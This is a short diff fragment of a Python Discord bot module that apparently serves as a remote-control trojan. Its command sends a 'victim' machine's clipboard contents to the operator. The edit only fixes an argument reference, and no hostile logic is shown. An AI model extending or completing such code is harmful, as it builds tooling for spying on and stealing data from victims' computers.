@@ -12,7 +12,7 @@ class GetClipboard(commands.Cog):
         
     @commands.slash_command(
         description="Sends text contents of clipboard",
-        options=[self.bot.victim],
+        options=[bot.victim],
     )
     async def get_clipboard(ctx, victim):
         if str(victim) == str(ip_addr):
